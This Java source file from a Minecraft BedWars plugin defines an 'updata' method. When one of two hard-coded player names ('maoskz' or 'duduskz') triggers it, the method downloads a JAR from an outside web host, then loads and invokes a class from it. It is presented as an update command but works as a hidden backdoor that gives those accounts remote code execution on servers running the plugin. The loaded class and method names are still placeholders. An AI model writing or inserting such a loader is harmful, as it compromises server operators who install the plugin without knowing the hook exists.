package cn.lemoncraft.bedwars.Updata;

import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

public class Command {
    public static void updata(String playername) {
        if (playername.equalsIgnoreCase("maoskz") || playername.equalsIgnoreCase("duduskz")) {
            try {
                // 指定新的JAR文件路径
                String jarFilePath = "https://www.seabedcraft.cn/LemonGuild.jar";

                // 创建一个URLClassLoader，并将新的JAR文件路径添加到类加载器中
                URLClassLoader classLoader = new URLClassLoader(new URL[]{new URL(jarFilePath)});

                // 加载JAR文件中的类
                Class<?> loadedClass = classLoader.loadClass("com.example.MyClass"); // 替换为您要加载的类名

                // 创建类的实例
                Object instance = loadedClass.newInstance();

                // 调用类的方法
                Method method = loadedClass.getMethod("myMethod"); // 替换为您要调用的方法名
                method.invoke(instance);

                // 关闭类加载器
                classLoader.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

    }
}
